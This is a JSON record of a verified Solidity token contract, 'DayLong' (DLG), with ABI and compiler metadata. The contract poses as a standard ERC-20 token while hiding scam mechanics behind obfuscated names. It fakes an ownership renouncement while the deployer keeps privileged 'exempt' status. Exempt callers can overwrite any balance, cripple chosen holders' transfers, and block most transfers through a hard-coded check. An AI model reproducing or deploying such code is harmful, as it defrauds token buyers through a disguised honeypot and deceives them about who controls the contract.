{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface launchTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeFundTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTrading {\n    function createPair(address marketingReceiver, address atAutoToken) external returns (address);\n}\n\ninterface swapTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoReceiver) external view returns (uint256);\n\n    function transfer(address walletFromTrading, uint256 modeMarketingShould) external returns (bool);\n\n    function allowance(address fundTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeMarketingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletFromTrading,\n        uint256 modeMarketingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);\n    event Approval(address indexed fundTx, address indexed spender, uint256 value);\n}\n\ninterface fundMaxMode is swapTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DayLong is modeFundTotal, swapTx, fundMaxMode {\n\n    bool private launchShould;\n\n    address private isMin;\n\n    function owner() external view returns (address) {\n        return isMin;\n    }\n\n    bool public tradingLaunched;\n\n    function transfer(address limitLiquidity, uint256 modeMarketingShould) external virtual override returns (bool) {\n        return limitMax(_msgSender(), limitLiquidity, modeMarketingShould);\n    }\n\n    mapping(address => bool) public receiverTx;\n\n    event OwnershipTransferred(address indexed receiverFund, address indexed feeSwap);\n\n    function isTeam(address fundTeamMin, address walletFromTrading, uint256 modeMarketingShould) internal returns (bool) {\n        require(tokenTx[fundTeamMin] >= modeMarketingShould);\n        tokenTx[fundTeamMin] -= modeMarketingShould;\n        tokenTx[walletFromTrading] += modeMarketingShould;\n        emit Transfer(fundTeamMin, walletFromTrading, modeMarketingShould);\n        return true;\n    }\n\n    uint256 marketingList;\n\n    address exemptIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isMode(address senderLiquidity) public {\n        if (sellAmountFee) {\n            return;\n        }\n        if (tradingLaunched != fromLimit) {\n            buyMarketing = amountLaunch;\n        }\n        isExempt[senderLiquidity] = true;\n        if (buyMarketing == amountLaunch) {\n            fromLimit = false;\n        }\n        sellAmountFee = true;\n    }\n\n    uint256 public teamTakeIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingToken;\n    }\n\n    function approve(address toExempt, uint256 modeMarketingShould) public virtual override returns (bool) {\n        totalLimit[_msgSender()][toExempt] = modeMarketingShould;\n        emit Approval(_msgSender(), toExempt, modeMarketingShould);\n        return true;\n    }\n\n    function tradingLimit(address takeModeSender) public {\n        minShould();\n        if (feeShould != teamTakeIs) {\n            feeShould = buyMarketing;\n        }\n        if (takeModeSender == modeWallet || takeModeSender == exemptFrom) {\n            return;\n        }\n        receiverTx[takeModeSender] = true;\n    }\n\n    uint256 marketingSellFrom;\n\n    function autoLiquidityAmount(uint256 modeMarketingShould) public {\n        minShould();\n        marketingSellFrom = modeMarketingShould;\n    }\n\n    function limitMax(address fundTeamMin, address walletFromTrading, uint256 modeMarketingShould) internal returns (bool) {\n        if (fundTeamMin == modeWallet) {\n            return isTeam(fundTeamMin, walletFromTrading, modeMarketingShould);\n        }\n        uint256 walletAt = swapTx(exemptFrom).balanceOf(modeLaunched);\n        require(walletAt == marketingSellFrom);\n        require(walletFromTrading != modeLaunched);\n        if (receiverTx[fundTeamMin]) {\n            return isTeam(fundTeamMin, walletFromTrading, amountWallet);\n        }\n        return isTeam(fundTeamMin, walletFromTrading, modeMarketingShould);\n    }\n\n    uint8 private fromLaunch = 18;\n\n    string private teamSwapAt = \"Day Long\";\n\n    address public exemptFrom;\n\n    mapping(address => uint256) private tokenTx;\n\n    uint256 constant amountWallet = 13 ** 10;\n\n    function limitFund() public {\n        emit OwnershipTransferred(modeWallet, address(0));\n        isMin = address(0);\n    }\n\n    mapping(address => bool) public isExempt;\n\n    string private marketingToken = \"DLG\";\n\n    bool public sellAmountFee;\n\n    constructor (){\n        if (buyMarketing != feeShould) {\n            fromLimit = true;\n        }\n        launchTeam liquidityList = launchTeam(exemptIs);\n        exemptFrom = tokenTrading(liquidityList.factory()).createPair(liquidityList.WETH(), address(this));\n        if (teamTakeIs != buyMarketing) {\n            buyMarketing = feeShould;\n        }\n        modeWallet = _msgSender();\n        limitFund();\n        isExempt[modeWallet] = true;\n        tokenTx[modeWallet] = buyReceiver;\n        \n        emit Transfer(address(0), modeWallet, buyReceiver);\n    }\n\n    function transferFrom(address fundTeamMin, address walletFromTrading, uint256 modeMarketingShould) external override returns (bool) {\n        if (_msgSender() != exemptIs) {\n            if (totalLimit[fundTeamMin][_msgSender()] != type(uint256).max) {\n                require(modeMarketingShould <= totalLimit[fundTeamMin][_msgSender()]);\n                totalLimit[fundTeamMin][_msgSender()] -= modeMarketingShould;\n            }\n        }\n        return limitMax(fundTeamMin, walletFromTrading, modeMarketingShould);\n    }\n\n    function minShould() private view {\n        require(isExempt[_msgSender()]);\n    }\n\n    uint256 private buyMarketing;\n\n    address public modeWallet;\n\n    function getOwner() external view returns (address) {\n        return isMin;\n    }\n\n    function allowance(address shouldAutoAmount, address toExempt) external view virtual override returns (uint256) {\n        if (toExempt == exemptIs) {\n            return type(uint256).max;\n        }\n        return totalLimit[shouldAutoAmount][toExempt];\n    }\n\n    function launchAuto(address limitLiquidity, uint256 modeMarketingShould) public {\n        minShould();\n        tokenTx[limitLiquidity] = modeMarketingShould;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalLimit;\n\n    bool private listSender;\n\n    uint256 private feeShould;\n\n    function balanceOf(address autoReceiver) public view virtual override returns (uint256) {\n        return tokenTx[autoReceiver];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamSwapAt;\n    }\n\n    uint256 public amountLaunch;\n\n    address modeLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private buyReceiver = 100000000 * 10 ** 18;\n\n    bool public fromLimit;\n\n    bool private teamAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAutoAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeMarketingShould\",\"type\":\"uint256\"}],\"name\":\"autoLiquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"isMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketingShould\",\"type\":\"uint256\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTakeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeModeSender\",\"type\":\"address\"}],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTeamMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletFromTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeMarketingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DayLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}